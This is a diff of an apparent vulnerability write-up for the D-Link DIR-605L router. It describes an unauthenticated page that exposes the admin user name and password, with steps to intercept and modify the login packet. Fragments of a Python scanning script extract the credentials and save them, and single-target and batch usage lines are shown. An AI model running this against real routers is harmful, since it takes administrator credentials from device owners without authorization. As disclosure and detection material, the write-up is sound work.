@@ -13,7 +13,7 @@ An attacker can access this page without authorization, obtain the user name and
 ## Test method
 1. Visit the d-link-dir-605L background login page
 
-
+![image](https://user-images.githubusercontent.com/90023952/131968944-a5cc3503-d2b9-4394-9a6b-7aaf6b7fdce9.png)
 
 2. Enter any password, then grab the packet and modify the packet content as follows
 
@@ -23,7 +23,7 @@ An attacker can access this page without authorization, obtain the user name and
 
 3.Use the obtained user name and password to successfully log in to the background
 
-
+![image](https://user-images.githubusercontent.com/90023952/131968995-dc5eee6b-049f-4144-8d3d-a2f8acfe9099.png)
 
 ## Script automation detection
 
@@ -75,7 +75,7 @@ if file !="":
                 name = re.findall('<name>.*', response.text)
                 password = re.findall('<password>.*', response.text)
                 print("[" + url + "]" + "[===dangerous===]")
-                w = open("DIR-615-Vulnerability-file.txt", "a")
+                w = open("DIR-605-Vulnerability-file.txt", "a")
                 w.write(url + '\r\n' + repr(name) + repr(password) + '\r\n')
             else:
                 print("[" + url + "]" + "[safe]")
@@ -88,16 +88,19 @@ if file !="":
 
 python D-LINK-DIR-605.py -u http://xxx.xxx.xxx.xxx
 
-![image](https://user-images.githubusercontent.com/90023952/131964546-cfb63863-5e3e-46a0-a237-94076f6a47d2.png)
+![image](https://user-images.githubusercontent.com/90023952/131969274-a2d83a61-02b6-4bbf-af98-d74d71336117.png)
 
 2. Batch inspection
 
 python D-LINK-DIR-605.py -r file.txt
 
-
+![image](https://user-images.githubusercontent.com/90023952/131969509-897cdfa0-25e4-4f5f-8b68-3c99b3deb6d1.png)
 
 After the batch detection script is executed, a file named "dir-605-vulnerability-file. TXT" will be generated in the current folder, with the contents of vulnerability URL and explored user name and password
 
+![image](https://user-images.githubusercontent.com/90023952/131969548-98b17445-98c1-4ce1-8b0a-284ed2430259.png)
+
+![image](https://user-images.githubusercontent.com/90023952/131969592-f7bc2332-458d-4476-be90-9ac6e5e72ac2.png)
 
 
 
